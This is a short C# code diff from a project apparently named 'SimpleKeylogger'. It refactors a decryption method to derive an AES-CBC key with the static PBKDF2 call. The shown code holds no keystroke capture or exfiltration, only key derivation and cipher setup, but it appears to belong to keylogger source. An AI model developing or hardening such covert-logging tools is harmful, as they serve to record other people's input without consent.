@@ -95,11 +95,15 @@ namespace SimpleKeylogger
         {
             byte[] cipherBytes = Convert.FromBase64String(cipherText);
             
-            using var derive = new Rfc2898DeriveBytes(
-                GetPassphrase(), _salt, 100000, HashAlgorithmName.SHA256);
+            byte[] key = Rfc2898DeriveBytes.Pbkdf2(
+                Encoding.UTF8.GetBytes(GetPassphrase()), 
+                _salt, 
+                100000, 
+                HashAlgorithmName.SHA256, 
+                32);
             
             using var aes = Aes.Create();
-            aes.Key = derive.GetBytes(32);
+            aes.Key = key;
             aes.IV = _iv;
             aes.Mode = CipherMode.CBC;
             aes.Padding = PaddingMode.PKCS7;
